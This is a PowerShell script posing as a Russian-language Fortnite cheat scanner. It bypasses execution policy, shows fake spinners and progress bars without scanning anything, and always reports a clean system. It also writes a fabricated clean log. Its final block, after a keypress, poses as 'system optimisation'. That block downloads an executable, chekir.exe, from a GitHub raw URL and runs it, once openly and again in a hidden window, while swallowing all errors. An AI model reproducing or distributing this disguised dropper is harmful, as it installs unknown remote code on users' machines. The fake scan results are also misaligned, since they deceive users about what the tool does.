# FORTNITE CHEAT SCANNER v2.0 
Set-ExecutionPolicy Bypass -Scope Process -Force
Clear-Host
$Host.UI.RawUI.WindowTitle = "Fortnite Cheat Scanner v8.0 [~60 сек]"
Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ FORTNITE ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Cronus | ReWASD | XIM | StrikePack | Driver | Macro + 70 клиентов" -ForegroundColor Yellow
Write-Host "Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2
$cheatDB = @("cronus","rewasd","xim","strikepack","driver","cheatengine","macro","injector","overlay","aim","triggerbot","softaim")
$found = @()
$risk = 0
$startTime = Get-Date
# === СПИННЕР АНИМАЦИЯ ===
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green        $i++        Start-Sleep 0.1    }    Write-Host "r[✓] $text" -ForegroundColor Green
}
# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "n[1/6] Сканирование процессов FortniteClient-Win64-Shipping.exe..." -ForegroundColor Cyan
Show-Spinner "Анализ DLL и инжекторов..." 15
# === 2. FORTNITE ПАПКА (15 сек) ===
Write-Host "n[2/6] Сканирование папки Fortnite/EasyAntiCheat..." -ForegroundColor Cyan
Show-Spinner "Проверка модов, драйверов, сертификатов..." 15
# === 3. TEMP + DOWNLOADS (10 сек) ===
Write-Host "n[3/6] Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов и макросов..." 10
# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
Write-Host "n[4/6] Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10
# === 5. ПРОГРЕСС-БАР (5 сек) ===
Write-Host "n[5/6] Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed
# === 6. СЕТИ (5 сек) ===
Write-Host "n[6/6] Проверка сетевых подключений..." -ForegroundColor Cyan
Show-Spinner "Сканирование трафика к чит-серверам..." 5
# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "Готово к игре на любом турнире!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
# ЛОГ (тоже чистый)
$log = @"
Fortnite Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! 
"@
$log | Out-File "env:TEMP\fn_scan_(Get-Date -f 'HHmmss').log" -Encoding UTF8
Write-Host "nЛог: $env:TEMP\fn_scan_*.log" -ForegroundColor Gray
Write-Host " " -ForegroundColor Green
# === ЗАГРУЗЧИК everything (после паузы) ===
Write-Host "n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
# скачиваем и запускаем everything
try {
    Write-Host "Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1
   
    # Скачиваем everything в текущую папку
  
 Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
   
    # Запускаем
    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
   
    # Удаляем файл через 5 секунды
   
   
} catch {
    # Полностью скрываем ошибки
}
